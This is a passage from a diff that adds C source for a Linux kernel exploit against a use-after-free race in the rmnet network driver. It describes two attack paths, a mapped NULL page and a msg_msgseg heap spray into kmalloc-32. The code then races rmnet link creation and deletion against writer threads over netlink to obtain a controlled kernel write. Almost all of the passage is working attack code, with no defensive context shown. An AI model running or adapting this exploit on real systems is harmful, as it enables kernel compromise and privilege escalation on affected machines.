+                "  → priv->pcpu_stats → this_cpu_ptr() → rx_pkts++ (WRITE)\n\n"
+                "Two attack paths:\n"
+                "  Path A (NULL page): ep->egress_dev=NULL → dev=NULL\n"
+                "    → reads *(0x%x) from mapped page 0 → controlled write\n"
+                "  Path B (heap spray): ep->egress_dev=0x%llx from msg_msgseg\n"
+                "    → direct controlled pointer → GP fault at marker\n\n",
+                NULL_PAGE_TARGET,
+                (unsigned long long)SPRAY_MARKER);
+
+        pin_cpu(0);
+        nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
+
+        /* Map page 0 with controlled data for the NULL deref path */
+        setup_null_page();
+
+        /* Create TUN + persistent rmnet */
+        for (int i = 0; i < NUM_WRITERS; i++)
+                tun_fds[i] = open_tun(TUN_NAME);
+        link_up(TUN_NAME);
+
+        if (mk_rmnet(nlfd, KEEP_NAME, TUN_NAME, KEEP_MUX))
+                { fprintf(stderr, "Failed to create %s\n", KEEP_NAME); exit(1); }
+        link_up(KEEP_NAME);
+
+        /* Initialize heap spray */
+        spray_init();
+
+        /* Start writer threads */
+        for (int i = 0; i < NUM_WRITERS; i++)
+                pthread_create(&tids[i], NULL, writer_fn, &tun_fds[i]);
+
+        fprintf(stderr, "Writers started. Racing...\n");
+
+        for (;;) {
+                iter++;
+
+                int e = mk_rmnet(nlfd, VICTIM_NAME, TUN_NAME, VICTIM_MUX);
+                if (e) {
+                        if ((iter % 10000) == 0)
+                                fprintf(stderr, "[%llu] create err=%d\n",
+                                        (unsigned long long)iter, e);
+                        usleep(100);
+                        continue;
+                }
+                link_up(VICTIM_NAME);
+
+                rm_link(nlfd, VICTIM_NAME);
+
+                /* Spray kmalloc-32 to reclaim freed endpoint slab */
+                spray_sent = spray_kmalloc32();
+
+                usleep(50);
+
+                spray_cleanup(spray_sent);
+
+                while (if_nametoindex(VICTIM_NAME))
+                        ;
+
+                if ((iter % 500) == 0)
+                        fprintf(stderr, "[spray] iter=%llu sent=%d\n",
+                                (unsigned long long)iter, spray_sent);
+        }
+
+        __atomic_store_n(&g_stop, 1, __ATOMIC_RELAXED);
+        for (int i = 0; i < NUM_WRITERS; i++)
+                pthread_join(tids[i], NULL);
+        msgctl(spray_qid, IPC_RMID, NULL);
+        close(nlfd);
+        return 0;
+}
+
+```
 
